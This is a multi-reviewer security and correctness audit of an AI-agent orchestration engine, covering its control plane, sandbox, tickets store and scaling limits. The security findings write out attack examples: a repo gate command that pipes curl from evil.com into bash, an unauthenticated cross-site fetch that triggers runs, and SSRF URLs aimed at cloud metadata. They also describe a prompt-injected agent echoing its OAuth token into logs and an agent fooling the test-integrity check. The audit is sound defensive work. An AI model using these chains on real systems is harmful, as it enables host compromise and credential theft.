# Adversarial System Audit — aiuda-forge engine (2026-06-25)

Read-only review by 5 parallel adversarial reviewers (orchestrator, kernel/execution,
data/state, security, architecture/scale). **No code was changed.** Findings are
de-duplicated and severity-normalized below. Cross-confirmed findings (flagged by two
independent reviewers) are marked ⊕.

## Meta-finding

The **happy path is solid and well-tested; the kernel's concurrency core (atomic claim +
fencing + single-emit) is genuinely excellent.** Defects concentrate in four areas the
test fakes structurally cannot reach:
1. **Error / non-happy paths** in the orchestrator (everything after a successful claim).
2. **The tickets store has no state machine** (unlike the kernel store, which does).
3. **Security posture for untrusted repos** (the system clones arbitrary repos, runs their
   code, and can auto-merge PRs).
4. **Single-tenant topology** — no `project_id` in the data model; settings are global.

## 🔴 CRITICAL — Security (the scariest; the system runs untrusted repo code)

- **C1 ⊕ No control-plane auth + CORS `*` (CSRF master key).** `cmd/control/main.go:99-108`,
  `httpx/auth.go:19-23`, `httpx/cors.go:12-15`. `VIBEFORGE_API_TOKEN` is optional → unset =
  "auth: OPEN". Any malicious web page the operator visits can `fetch('http://localhost:8080/runs',
  {method:'POST', ...})` — no CSRF/origin/SameSite. Arms every finding below remotely with zero
  creds: POST /runs (RCE), PUT /settings (flip merge_mode=auto), DELETE /runs.
- **C2 Malicious `.vibeforge-gate` → host RCE in local-sandbox mode.** `gate/runner.go:30-47`,
  `sandbox/sandbox.go:178-186`. The gate command is read from the cloned repo and run via
  `bash -c`; `LocalSandbox` is "NOT a security boundary". A repo with
  `.vibeforge-gate=curl evil.com|bash` runs on the host. The seal only stops the *agent*
  editing the gate post-seal; a born-malicious gate is sealed as-is, then executed.
- **C2b ⊕ Docker isolation silently degrades to host.** `agent/runner.go:99-103`,
  `sandbox/agent.go:64-66`. If `docker info` fails, `Sandboxed:true` becomes `LocalSandbox`
  — agent + gate run on the host with the operator's real `~/.claude` creds and the egress
  proxy bypassed (HTTPS_PROXY is set only in the docker branch). The boundary is advisory.
- **SCARIEST (C1+C2+C2b):** an unauthenticated CORS-`*` `POST /runs` with `payload.repo`
  pointing at an attacker repo whose `.vibeforge-gate` is `curl evil.com|bash`, executed on the
  host whenever Docker isn't active = **full host compromise from a dev merely visiting a web
  page** while the control plane runs on localhost.

- **C3 SSRF + creds-in-URL via `ValidateRemote`.** `httpx/remote.go:27-40`. Only the scheme
  prefix is checked; the host is never parsed. Passes: `https://169.254.169.254/...` (cloud
  metadata), `https://internal-jenkins:8080/...`, `https://oauth2:TOKEN@github.com/...`, and
  `https://github.com.evil.com/` (prefix match defeats the allowlist).
- **C4 ⊕ `step.event` live-log captures secrets, served unauthenticated.** `agent/events.go:46-94`,
  `api/server.go:446-458`. Every Bash tool-use persists the literal command + output; a
  prompt-injected agent running `echo $CLAUDE_CODE_OAUTH_TOKEN` lands the real token in the
  event store, readable via unauth `GET /runs/{id}/events`. No redaction.
- **C5 Unvalidated `story.repo`/`pr_url` → auto-merge on arbitrary repo.** `api/tickets.go:172-191`,
  `orchestrator/native.go:519-533`. `CreateStory` inserts repo/pr_url verbatim; `merge_mode=auto`
  then runs `gh pr merge` against whatever repo the (unauth) caller supplied.

## 🔴 BLOCKER — Correctness (wedges or loses work)

- **B1 ⊕ `MarkSprintDone` advances `running` stories to done.** `tickets.go:618-621`. The
  `WHERE sprint_id=? AND status IN ('running','in_review')` clause means merging ONE story's PR
  flips *every* running+in_review story in the sprint to done — including stories whose run never
  finished and whose work is in no merged PR. Fabricates "done", unblocks dependents on
  un-merged work.
- **B2 ⊕ No state machine in the tickets store — terminal states get resurrected.**
  `tickets.go:300-310, 326-336, 646-669`. `MarkDone`/`MarkInReview`/`MarkFailed`/`UpdateStoryStatus`
  are all unconditional `UPDATE ... WHERE id=?`. `MarkFailed` on a done story → done→failed; a stale
  completion path can drag a failed/done story back into `in_review` and into the reconcile loop.
  (Only `ClaimStory` and `MarkSprintInReview` are guarded — the inconsistency is itself a bug.)
- **B3 Failed `FireRun` after a successful `Claim` strands the story forever.** `native.go:643-691,
  835-887`. Claim → `running`; FireRun errors → `log; continue` → story is `running` with
  `run_id==""`, which the completion loop skips forever (`if t.RunID=="" {continue}`). Never
  Ready again, never failed, never re-fired. A restart does NOT fix it (state is in the store).
  Sprint mode wedges the *entire* claimed sprint.
- **B4 `MarkRunning` failure after a successful `FireRun` orphans the run.** `native.go:685-688,
  888-891`. A real factory run is executing/costing money; recording its `run_id` fails →
  `log; continue` → story stuck `running`, run_id lost, PR orphaned, never reconciled.
- **B5 Deferred `SyncBack` is unguarded by the fence → reaper race corrupts the worktree.**
  `agent/runner.go:82-104`. A multi-minute agent step can be reaped (`RequeueStale` → fence bump
  → worker B re-runs on the SAME workdir); when the stale worker A returns, its
  `defer SyncBack(agentDir, workdir)` fires unconditionally — `RemoveAll`s the workdir and
  recopies stale content while B is writing it. The fence correctly discards A's *DB* result,
  but the *filesystem* side effect already happened. Sibling of the symlink bug already fixed;
  the sync path has zero concurrency/fence guard. **Untested** (fakes return instantly).

## 🟠 HIGH

- **H1 ⊕ `in_review` with an empty PR hangs forever.** `native.go:615, 780, 815` (`prURL, _ :=
  RunPRURL(...)` — error discarded). A DONE run whose `pr` step failed, or whose URL isn't
  recorded yet, yields `prURL==""` → `MarkInReview("")`; `reconcileOne` does
  `if t.PRURL=="" {return false}` → never advances, any mode, forever. A DONE-but-pr-step-FAILED
  run should be treated as failed, not parked.
- **H2 Closed/conflicted PR → infinite auto-merge loop.** `native.go:519-536`. A human *closing*
  (not merging) a PR, or an auto-merge that fails (conflict / branch protection), is retried every
  cycle forever — no terminal detection, no backoff, no failure threshold.
- **H3 `countFailures` not scoped to the loop entry → retry breaks `on_fail.max`.**
  `workflow/engine.go:310-322`, `engine_control.go:28-52`. It counts ALL FAILED tasks for a step id
  across the whole run; `RetryRun` re-enqueues without clearing prior FAILED tasks, so retrying a
  run that exhausted `max:2` fails immediately with zero retry budget.
- **H4 `scanner.Err()` never checked in the claude backend.** `agent/claude.go:104-138`. A tool
  payload >16 MB makes `Scan()` return false with `ErrTooLong`; depending on order, this is either
  a silently-truncated SUCCESS or a misreported "claude produced no result line". Real cause
  swallowed.
- **H5 ⊕ Tickets store SQLite weaker than the kernel store.** `tickets.go:123` lacks
  `_txlock=immediate` (the kernel store has it); neither Open sets `SetMaxOpenConns(1)`.
  `ClaimSprint` uses deferred `BEGIN` (write lock acquired late, after the COUNT) → two concurrent
  claimers can both pass the COUNT, and the loser gets a hard "database is locked" error instead of
  the intended `ok=false`. The "database is locked" surface under the worker pool.
- **H6 Dependency on a non-existent story → silent permanent deadlock.** `tickets.go:718-733`.
  `deps:[S-999]` (typo / failed publish) returns "not done" forever; never Ready, never logged.
  No validation that dep IDs resolve at CreateStory/publish.
- **H7 No cycle / self-dep detection.** `tickets.go:449-495`. `AddDep(S-1,[S-1])` is accepted →
  deadlock; an intra-sprint cycle makes `topoSortStories` "degrade to id order" → the sprint fires
  in arbitrary order (stories before their deps) with no error.

## 🟡 MEDIUM / notable smells

- **M1 Orphaned container on timeout.** `claude.go` kills the host docker *client* process group;
  the container (child of dockerd) survives, holding the egress net + `/work` mount (`--rm` only
  cleans on normal exit).
- **M2 Gate suite-integrity is content-grep, not test-aware.** `gate/gate.go:68-88`. Counts
  `def test_`/`it(` across the whole tree (incl. `.venv`, `node_modules`, comments) → defeatable
  (agent adds `def test_` strings anywhere) AND flaky (regenerating a vendored dep trips
  `ErrSuiteShrank`).
- **M3 Approve/Reject unfenced & non-atomic.** `engine_control.go:58-105`. Concurrent approve →
  one succeeds, the other 500s; approve racing cancel → silent no-op that looks like success.
- **M4 Output-doc write erased by `SyncBack`.** `agent/runner.go:125-133`. A design step whose
  agent returns the doc as TEXT (not a written file) has it written to the workdir, then the
  deferred SyncBack overwrites the workdir — the artifact is silently lost in sandboxed mode.
- **M5 Unguarded `MarkRunning` rewrites status.** `native.go:193` → `UpdateStoryStatus(id,"running")`
  (unguarded) can resurrect a failed/done story to running between Claim and MarkRunning.
- **M6 Migrations not Postgres-safe; `isSQLiteConflict` over-broad.** `tickets.go:107-142, 737-743`,
  `publish.go:187-197`. Duplicate-column detection matches a SQLite-only string; `isSQLiteConflict`
  swallows CHECK/FK violations too (a malformed publish is silently "skipped").
- **M7 Egress filter lacks a start-anchor.** `deploy/egress-proxy/filter`. `pypi\.org$` matches
  `evilpypi.org` → exfil channel. Use `^(.*\.)?pypi\.org$`.
- **M8 oauth/subscription token crosses into the sandbox in clear** (`egress.go:67-71`); only
  api_key mode uses the sentinel+proxy. Exfiltrable via the allowed anthropic/pypi/npm egress.
- Lower-confidence: heartbeat double-now (cosmetic), `buildContext` last-writer-wins on loop
  attempts, missing-`$ref`→"" injects blank feedback silently, `pr.go` github-mode failure reported
  as Success:true, no special-file skip in CopyTree, gate Snapshot reads whole files into memory.

## 🏛️ ARCHITECTURE & SCALE (single-tenant by construction)

- **A1 ⊕ No `project_id` in the execution data model.** `store.go:36-76`, `tickets.go:81-93` — runs,
  tasks, events, stories have no project column; the `projects` store is an orphan island. Cross-project
  identity is smuggled via the repo URL on the run payload. At 2+ projects `GET /tickets` returns ALL
  stories mixed; the board/spend can't be scoped without a migration.
- **A2 ⊕ Global settings make concurrent multi-stack execution *incorrect*, not just incomplete.**
  `settings.go:22-43`. `execution_unit`/`merge_mode`/`merge_policy` (and the sandbox image,
  `app.go:95`) are process-global. Project A wanting `auto` and B wanting `manual` → one is wrong.
- **A3 Run workdirs are never GC'd; the events table is never pruned.** `engine.go:85` creates
  `.vibeforge-runs/<id>` (full repo clone + node_modules/.venv), nothing removes it; events grow
  unbounded. On a long-lived host this is a **guaranteed disk-full outage** → all new clones fail.
- **A4 Single SQLite writer + single control process is a hard ceiling.** Every claim/transition/
  heartbeat/event is a write through one lock; the claim does an N+1 dep loop under that lock. At
  ~100 concurrent runs claims block to the 10s `busy_timeout` then error; adding worker processes
  makes contention worse. The advertised "one-line Postgres swap" is actually a claim rewrite.
- **A5 Serial orchestrator, no-timeout HTTP client, `gh` shellout per in_review PR.**
  `controlplane.go:23` (`http.Client{}` no timeout), `native.go:519,529`. One hung `gh`/`GET /runs`
  stalls the whole scheduler; 100 in_review PRs = 100 sequential shellouts per cycle → ready work
  starves. No queue/backpressure.

**Scaling wall:** 1 project = solid. **~2 projects = correctness breaks** (global settings + no
project_id, A1/A2). ~10 = operability (serial orchestrator, disk). ~100 = throughput collapse
(SQLite writer, events table). The wall is the singletons wrapped around a good kernel, and the
first bricks hit at 2 projects, not 100.

## ✅ What's genuinely solid (don't regress)

- **Atomic claim + fence + heartbeat** (`store/claim.go`) — `BEGIN IMMEDIATE` before any read =
  real SKIP-LOCKED on SQLite; zombie workers' late writes rejected by the fence; tested under `-race`.
- **Single emit point inside the tx** (`store.go:297`) — events can never disagree with state.
- **The generic executor has no business logic** (`engine.go advance`) — step types are a registry
  map; gate-fix and human-reject loops are the same `on_fail` primitive. The small-kernel claim holds.
- **Sandbox boundary is real & defensive** — env allowlist excludes creds by default, `.git`-less
  worktree, symlink-preserving copy, git/push outside the sandbox. `LocalSandbox` honestly labels
  itself not-a-boundary.
- **Registry path traversal is solidly blocked** (`helpers.go pathFor`) — Clean + root re-check,
  catches `%2f`, fails closed, tested. `ext::`/`file://` git-RCE vectors blocked + test-pinned.
  SQL is parameterized throughout. Secret masking + positive env allowlist keep tokens out of config.
- **Merge-gated happy path** (DONE→in_review→merged→done→unblock) is correct and tested in both modes.

## Recommended remediation — by wave (not yet implemented)

**Wave 0 — Security floor (do before any shared/remote use).**
C1 mandatory auth or loopback-bind + token + origin check; C2/C2b hard-fail when Docker/gVisor
isolation is unavailable (never run a gate/agent on the host); C3/C5 parse-and-allowlist every
repo URL on entry; C4 redact secrets from `step.event` (or gate the events endpoint); M7 anchor the
egress filter.

**Wave 1 — State-machine integrity (kills the false-done / stuck classes).**
B1 drop the `running` clause from `MarkSprintDone`; B2 add `WHERE status IN (...)` guards (or a
`legalTransitions` table like the kernel store) to every tickets mutator; H5 add `_txlock=immediate`
+ `SetMaxOpenConns(1)` to the tickets DSN.

**Wave 2 — Orchestrator error paths (kills the stuck/hang/loop classes).**
B3/B4 compensating actions (FireRun fails after Claim → reset to backlog; persist run_id durably;
completion loop must not skip `running` stories with empty run_id forever); H1 treat DONE-with-no-PR
as failed, don't park in_review; H2 detect closed/conflicted PRs as terminal + bound auto-merge
retries.

**Wave 3 — Kernel races & robustness.**
B5 fence-guard the deferred SyncBack; H3 scope `countFailures` to the loop entry; H4 check
`scanner.Err()`; M1 kill the container by id; M3 make approve/reject transactional.

**Wave 4 — Multi-project foundation (before concurrent projects).**
A1 add `project_id` to runs/tasks/events/stories + thread it through trigger/seed/list filters;
A2 move execution_unit/merge_mode/merge_policy to per-project settings; per-project (or
project-aware parallel) scheduler.

**Wave 5 — Operability at scale.**
A3 workdir GC + events retention; A4 Postgres + a real SKIP-LOCKED claim; A5 client timeouts +
backpressure + parallel reconcile.
